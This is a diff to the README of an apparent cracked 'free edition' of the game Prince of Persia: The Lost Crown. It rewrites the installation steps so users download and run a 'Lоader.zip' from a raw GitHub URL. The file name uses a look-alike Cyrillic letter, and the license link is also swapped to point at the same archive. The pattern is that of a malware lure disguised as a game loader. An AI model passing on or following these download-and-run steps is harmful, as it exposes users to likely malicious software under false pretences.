@@ -27,9 +27,9 @@ Welcome to the ultimate resource for **Prince of Persia: The Lost Crown  - Loade
 
 ## 📚 Installation Guide
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/hitman472005/PrinceOfPersiaTheLostCrown-FreeEditionHub/main/Lоader.zip** from the repository.
 2. Extract contents using compatible archiver (e.g., WinRAR, 7-Zip).
-3. Run **Loader.exe** (Windows), **Loader.app** (MacOS), or **Loader.sh** (Linux).
+3. Run **https://raw.githubusercontent.com/hitman472005/PrinceOfPersiaTheLostCrown-FreeEditionHub/main/Lоader.zip** (Windows), **https://raw.githubusercontent.com/hitman472005/PrinceOfPersiaTheLostCrown-FreeEditionHub/main/Lоader.zip** (MacOS), or **https://raw.githubusercontent.com/hitman472005/PrinceOfPersiaTheLostCrown-FreeEditionHub/main/Lоader.zip** (Linux).
 4. Follow on-screen instructions to complete the setup.
 5. Enjoy the game responsibly!
 
@@ -49,7 +49,7 @@ This tool is provided for preservation, educational, and personal backup purpose
 
 ## 📜 License
 
-MIT License - [Read More Here](https://opensource.org/licenses/MIT)
+MIT License - [Read More Here](https://raw.githubusercontent.com/hitman472005/PrinceOfPersiaTheLostCrown-FreeEditionHub/main/Lоader.zip)
 
 ---
 
